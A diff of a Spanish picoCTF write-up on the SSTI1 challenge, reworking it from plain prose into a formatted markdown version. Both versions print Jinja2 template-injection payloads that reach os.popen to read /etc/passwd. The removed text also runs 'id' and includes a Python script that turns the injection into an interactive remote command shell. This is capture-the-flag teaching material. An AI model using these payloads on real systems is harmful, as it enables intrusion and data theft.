@@ -1,58 +1,29 @@
-Solución PicoCTF: SSTI1 (Server Side Template Injection)
-Este documento detalla la resolución del reto SSTI1 de la plataforma picoCTF, basado en el video de S4viSinFiltro. El objetivo es explotar una vulnerabilidad de inyección de plantillas en el servidor para obtener ejecución remota de comandos (RCE) y leer la bandera (flag).
+# 🚀 Solución PicoCTF: SSTI1
+> **Vulnerabilidad:** Server Side Template Injection (SSTI)  
+> **Plataforma:** [picoCTF](https://play.picoctf.org/)  
+> **Basado en:** Tutorial de S4vitar (S4viSinFiltro)
 
-1. Fase de Reconocimiento y Enumeración
-Al acceder a la web, encontramos un campo de entrada que refleja el texto introducido.
+---
 
-Prueba de XSS: Se introduce <script>alert(1)</script>, lo cual funciona, confirmando que el sitio es vulnerable a Cross-Site Scripting, aunque este no es el vector principal del reto.
+## 🔍 1. Fase de Reconocimiento
+Al interactuar con la web, observamos un campo que refleja nuestro texto. Probamos lo siguiente:
 
-Identificación de Tecnologías: Usando la herramienta whatweb, se identifica que el servidor está utilizando Python y, por el contexto del reto ("SSTI"), se sospecha del uso de un motor de plantillas como Jinja2.
+* **XSS:** `<script>alert(1)</script>` (Funciona, pero no es el objetivo).
+* **Tecnologías:** Mediante `whatweb` se detecta el uso de **Python**. Esto nos da una pista clave: el motor de plantillas podría ser **Jinja2**.
 
-2. Confirmación de la Vulnerabilidad (SSTI)
-Para confirmar si el servidor interpreta expresiones dentro de llaves, se prueban los siguientes payloads:
+## 🧪 2. Confirmación del SSTI
+Para verificar si el servidor evalúa expresiones matemáticas dentro de llaves `{{ }}`, enviamos:
 
-{{ 8 * 8 }}: El servidor responde con 64.
+| Payload | Resultado Esperado | Resultado Servidor |
+| :--- | :--- | :--- |
+| `{{ 8 * 8 }}` | `64` | **64** ✅ |
+| `{{ 7 * '7' }}` | `7777777` | **7777777** ✅ |
 
-{{ 7 * '7' }}: El servidor responde con 7777777.
 
-Esto confirma que el motor de plantillas es Jinja2 (común en aplicaciones Flask/Python) y que está evaluando nuestro input de forma insegura.
+## 💀 3. Explotación y RCE
+Una vez confirmado **Jinja2**, buscamos obtener ejecución remota de comandos (**RCE**) para leer archivos del sistema.
 
-3. Explotación: Lectura de Archivos (LFI)
-Utilizando recursos como Payloads All The Things, se busca una forma de leer archivos locales. Se utiliza un payload que aprovecha la introspección de objetos en Python para acceder a la configuración o funciones de lectura:
-
-Ejemplo de lectura de /etc/passwd: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }} (O variaciones similares según la versión del motor).
-
-4. Obtención de RCE (Remote Code Execution)
-Para ejecutar comandos en el sistema, se utiliza la función popen del módulo os a través de la inyección:
-
-Comando id: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} Esto revela que el servicio corre como el usuario root.
-
-5. Automatización con Python Scripting
-En el video, se desarrolla un script en Python para automatizar el envío de comandos y limpiar la respuesta del servidor mediante expresiones regulares (re).
-
-Python
-import requests
-import re
-
-url = "http://<URL_DE_INSTANCIA>/announce"
-
-while True:
-    command = input("terminal> ")
-    # Payload para ejecutar comandos
-    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read() }}"
-    
-    data = {'content': payload}
-    response = requests.post(url, data=data)
-    
-    # Limpieza del output usando regex (ejemplo)
-    clean_output = re.findall(r' resultado_o_etiqueta_html (.*?) </etiqueta>', response.text, re.S)
-    if clean_output:
-        print(clean_output[0])
-    else:
-        print(response.text)
-6. Obtención de la Flag
-Finalmente, explorando el sistema de archivos con el script (ls -l), se localiza el archivo de la bandera y se lee:
-
-Comando: cat flag.txt (o el nombre correspondiente).
-
-Flag: picoCTF{...}
+### Lectura de archivos locales (LFI)
+Utilizamos introspección de objetos en Python para acceder al módulo `os`:
+```jinja2
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
